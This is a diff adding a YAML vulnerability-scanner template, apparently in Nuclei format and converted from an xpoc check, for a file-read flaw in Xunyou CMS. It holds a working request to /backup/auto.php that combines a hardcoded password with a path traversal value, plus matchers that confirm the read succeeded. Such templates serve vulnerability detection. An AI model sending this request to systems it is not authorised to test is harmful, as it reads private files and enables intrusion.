@@ -1,0 +1,25 @@
+id: yaml-poc-xunyou-xunyou_cms-readfile-CT-158560
+info:
+  name: Yaml Poc Xunyou Xunyou_Cms Readfile Ct 158560
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-xunyou-xunyou_cms-readfile-CT-158560'
+  tags: lfi
+  reference: []
+http:
+- method: GET
+  path:
+  - /backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php
+  headers:
+    Accept-Encoding: deflate
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - NzbwpQSdbY06Dngnoteo2wdgiekm7j4N
+    - display_errors
